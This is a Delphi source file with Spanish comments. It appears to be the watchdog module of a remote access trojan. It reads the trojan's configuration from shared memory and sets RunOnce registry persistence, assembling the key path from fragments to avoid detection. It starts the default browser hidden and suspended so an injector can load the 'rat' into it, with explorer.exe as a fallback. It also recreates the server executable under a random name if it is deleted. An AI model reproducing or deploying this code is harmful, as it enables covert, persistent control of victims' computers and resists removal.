library monitor;


uses
  Windows,
  minireg,
  SettingsDef, //Para leer configuración
  SHFolder,    //Para conseguir %appdir%
  ShellApi;


var
  MCompartida   : THandle; //Para leer la configuracion de memoria
  ConfigCompartida : PConfigCompartida;
  Configuracion:   TSettings;
  InyectorPath : string;
  VecesCerrado: integer; //Número de veces que se ha muerto o han matado iexplore.exe


function inttostr(const value: integer): string;
var
  S:      string[11];
begin
  Str(Value, S);
  Result := S;
end;


function FindWindowsDir: string;
  //Retorna el directorio de Windows
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetWindowsDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;


function FindSystemDir: string;
  //Retorna el directorio de Windows
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetSystemDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;


function lc(const S: string): string;
  const a=1;
var
  Max, CharNo : Cardinal;
  pResult : PChar;
begin
  Max := Length(S);
  SetLength(Result, Max);
  if Max <= 0 then exit;
  pResult := PChar(Result);
  CharNo := 0;
  repeat
    pResult[CharNo] := S[CharNo+a];
    if (S[CharNo+a]>= 'A') and (S[CharNo+a] <= 'Z') then
      pResult[CharNo] := char(Ord(S[CharNo+a]) + 32);
    Inc(CharNo);
  until(CharNo>= Max);
end;


function FindTempDir: string;
  //Retorna el directorio de los temporales
var
  DataSize: byte;
begin
  SetLength(Result, MAX_PATH);
  DataSize := GetTempPath(MAX_PATH, PChar(Result));
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;


function FindRootDir: string;
  //Retorna el root del directorio de windows
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetWindowsDirectory(PChar(Result), 255);
  if DataSize <> 0 then
    Result := Copy(Result, 1, 3);
end;


function stringreplace(s1:string;s2:string;s3:string):string; { (copyto) windir DIR}
begin
  s1 := lc(s1);
  s2 := lc(s2);
  s3 := lc(s3);

  if(Pos(s2, 'a'+s1) - 1)>0 then
    result := s3+Copy(s1, length(s2)+1, length(s1)-length(s2))
  else
    result := s1;
end;


function GetSpecialFolderPath(folder : integer) : string;
const
  SHGFP_TYPE_CURRENT = 0;
var
  path: array [0..MAX_PATH] of char;
begin
  if SUCCEEDED(SHGetFolderPath(0,folder,0,SHGFP_TYPE_CURRENT,@path[0])) then
    Result := path
  else
    Result := '';
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
end;


function fileexists(const filename: string): boolean;
var
  filedata      :twin32finddata;
  hfile         :cardinal;
begin
  hfile := findfirstfile(pchar(filename), filedata);
  if (hfile <> invalid_handle_value) then
  begin
    result := true;
    windows.findclose(hfile);
  end
  else
    result := false;
end;


function getBrowser: ansistring;
var
  ts: ansistring;
begin
  RegGetString(HKEY_CLASSES_ROOT, '\htmlfile\shell\open\command\', ts);
  ts     := Copy(ts, Pos('"', ts) + 1, Length(ts));
  ts     := Copy(ts, 1, Pos('"', ts) - 1);
  Result := ts;
end;


procedure leerconfiguracion();
var
clave:string;
begin
  MCompartida:=OpenFileMapping(FILE_MAP_READ,False,'Config');
  if(MCompartida <> 0) then //Leida con Éxito :D
  begin
    ConfigCompartida:=MapViewOfFile(Mcompartida,FILE_MAP_READ,0,0,0);
    Configuracion.sHosts                    := ConfigCompartida.sHosts;
    Configuracion.sID                      := ConfigCompartida.sID;
    Configuracion.bCopiarArchivo           := ConfigCompartida.bCopiarArchivo;
    Configuracion.sFileNameToCopy          := ConfigCompartida.sFileNameToCopy;
    Configuracion.sCopyTo                  := ConfigCompartida.sCopyTo;
    Configuracion.bCopiarConFechaAnterior  := ConfigCompartida.bCopiarConFechaAnterior;
    Configuracion.bMelt                    := ConfigCompartida.bMelt;
    Configuracion.bArranqueRun             := ConfigCompartida.bArranqueRun;
    Configuracion.sRunRegKeyName           := ConfigCompartida.sRunRegKeyName;
    Configuracion.sPluginName              := ConfigCompartida.sPluginName;
    Configuracion.sInyectadorFile          := ConfigCompartida.sInyectadorFile;
    Configuracion.bArranqueActiveSetup     := ConfigCompartida.bArranqueActiveSetup;
    Configuracion.sActiveSetupKeyName      := ConfigCompartida.sActiveSetupKeyName;

    if(ConfigCompartida.bCerrarMonitor) then halt; //El servidor se está desinstalando
    UnmapViewOfFile(ConfigCompartida);
    CloseHandle(MCompartida); //La escribimos
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,'%WinDir%\', FindWindowsDir());
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,'%SysDir%\', FindSystemDir());
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,'%TempDir%\', FindTempDir());
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,'%RootDir%\', FindRootDir());
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,'%AppDir%\', GetSpecialFolderPath(CSIDL_LOCAL_APPDATA));

    Clave := 'SOFTWARE\Mic';
    Clave := Clave + 'rosoft\Wind';
    Clave := Clave + 'ows\CurrentVe';
    Clave := Clave + 'rsion\RunOnce\';
    Clave := Clave + Configuracion.sRunRegKeyName;
    if(Configuracion.bArranqueRun) and fileexists(Pchar(configuracion.sCopyTo+Configuracion.sFileNameToCopy)) then
      RegSetString(HKEY_CURRENT_USER, Clave, (configuracion.sCopyTo+ Configuracion.sFileNameToCopy+' s'{la s es para que espere un poco antes de inyectarse}));
    end;
end;


procedure StartMonitor;
var
  StartInfo: TStartupInfo;
  ProcInfo:  TProcessInformation;
begin

  LeerConfiguracion(); //Leemos la configuración de memoria

  if (not (Configuracion.bCopiarArchivo)) and (Configuracion.sInyectadorFile<>'') then
    InyectorPath := Configuracion.sInyectadorFile //No nos instalaremos así que utilizamos el inyectorfile
  else
  if(fileexists(Configuracion.sInyectadorFile)) then
    InyectorPath := Configuracion.sInyectadorFile //Aun no nos hemos instalado
  else
  InyectorPath := Configuracion.sCopyTo+Configuracion.sFileNameToCopy; //Ya estamos instalados!

  if FileExists(InyectorPath) then
  begin
    if(VecesCerrado > 2) and (VecesCerrado < 5) then  //A fallado la inyeccion mas de dos veces y menos de seis o nos han cerrado mas de dos veces y menos de seis
    begin
      ShellExecute(0, 'open', PAnsiChar(InyectorPath), PAnsiChar(' rat ultima'), nil, SW_SHOWNORMAL); //Mandamos que inyecten el RAT en explorer.exe como último recurso
     { sleep(10000);
      halt; //Nosotros nos vamos   }
    end
    else
    begin //Nos cargamos en el defaultbrowser como siempre...
      ZeroMemory(@StartInfo, SizeOf(TStartupInfo));
      StartInfo.cb      := SizeOf(TStartupInfo);
      startinfo.dwFlags := STARTF_USESHOWWINDOW; //Use wShowWindow
      startinfo.wShowWindow := SW_HIDE; //Create process to inject into
      CreateProcess(pchar(GetBrowser), '', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
      ShellExecute(0, 'open', PAnsiChar(InyectorPath), PAnsiChar(' rat ' + IntToStr(procInfo.dwProcessId)), nil, SW_SHOWNORMAL);
      WaitForSingleObject(ProcInfo.hProcess, INFINITE);
    end;
    VecesCerrado := VecesCerrado+1;
  end;
end;


function caracteraleatorio():string;
const
  xcarac    = 'abcdefghijklmnopqrstuvwxyz';
begin
  Result := '';
  Randomize;
  Result := xcarac[ Random(length(xcarac))+1 ];
end;


procedure escribirarchivo(sPath:string; content:string);
var
  ServerFile : File;
  tamano:integer;
begin
  tamano := length(content);
  AssignFile(ServerFile, sPath);
  ReWrite(ServerFile, 1);
  Blockwrite(ServerFile, Content[1], tamano); //Cargado archivo a servdll
  CloseFile(ServerFile);
end;


procedure EscribirSiBorran; //Rutina que se encarga de copiar el exe a otra ubicacion si lo borran
var
  copiado              : boolean;
  ConfigToSave         : PSettings;
  leido                : boolean ;
  InyectadorContent    : string;
  InyectadorContentTemp: string;
  Clave                : string;
  ServerFile           : File;
  Tamano               : integer;
  Nruta                : string;
  Nnombre              : string;
begin
  LeerConfiguracion();
  Leido := false;
  Copiado := false;
  InyectadorContentTemp := '';
  InyectadorContent := '';
  while Configuracion.bCopiarArchivo do //Solo si nos han mandado instalarnos
  begin
    sleep(2500);
    LeerConfiguracion(); //Leemos la configuración
    sleep(2500);
    if(fileexists(Configuracion.sCopyTo+Configuracion.sFileNameToCopy) and (not(leido))) then
    begin
      FileMode := $0000;
      AssignFile(ServerFile, Configuracion.sCopyTo+Configuracion.sFileNameToCopy);
      Reset(ServerFile,1);
      tamano := FileSize(ServerFile);
      if tamano > 0 then
      begin
        SetLength(InyectadorContentTemp, tamano);
        BlockRead(ServerFile, InyectadorContentTemp[1], tamano);
      end;
      CloseFile(ServerFile);
      if(length(InyectadorContentTemp) > 0) then
      begin
        InyectadorContent := InyectadorContentTemp; //Leemos el contenido de nuestro server
        Leido := true;
      end;
    end;
     
    if(leido) then
    begin //Tenemos el archivo para escribirlo a un nuevo directorio de instalación  en caso de que haga falta
      if (not fileexists(Configuracion.sCopyTo+Configuracion.sFileNameToCopy)) then
      begin
        Nruta := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA); //Es el dir que menos problemas da en cuanto a permisos
        Nnombre :=  caracteraleatorio()+caracteraleatorio()+caracteraleatorio()+caracteraleatorio()+caracteraleatorio()+caracteraleatorio()+'.exe'; //nombre aleatorio de 6 caracteres
        escribirarchivo(Configuracion.sCopyTo+Configuracion.sFileNameToCopy,inyectadorcontent); //escribimos a su nueva ubicación
         Clave := 'SOFTWARE\Mic';
        Clave := Clave + 'rosoft\Wind';
        Clave := Clave + 'ows\CurrentVe';
        Clave := Clave + 'rsion\RunOnce\'; //Aquí pasaremos más indetectables y ademas se volvera a iniciar el inyectador.exe si nos matan
        Clave := Clave + Configuracion.sRunRegKeyName;
        if(Configuracion.bArranqueRun) and fileexists(Pchar(Nruta+Nnombre)) then
          RegSetString(HKEY_CURRENT_USER, Clave, (Nruta + Nnombre+' s'{la s es para que espere un poco antes de inyectarse}));

        sleep(20000); //Después de que ha pasado un tiempo prudencial se vuelve a ejecutar :p
        if fileexists(Pchar(Nruta+Nnombre)) then
        ShellExecute(GetDesktopWindow(), 'open',PChar('"' + Nruta + Nnombre + '"'),'', nil, 0)
      end;
    end;
  end;
end;
  
var
  id1: longword = 0;
begin
  VecesCerrado := 0; //Las veces que han cerrado el proceso iexplore.exe
  
  BeginThread(nil,0,Addr(EscribirSiBorran),nil,0,id1);
  
  while (True) do
  begin
    StartMonitor;
    //No seguir ejecutando IE e inyectando si Windows se está apagando
    //if winShutDown then Exit;
    sleep(20000);//Le da un poco de estabilidad por si la inyeccion falla  y además deja un tiempo par aque windows se apague
  end; //while
  // http://www.youtube.com/watch?v=4Rc5o9PbJNo

end.
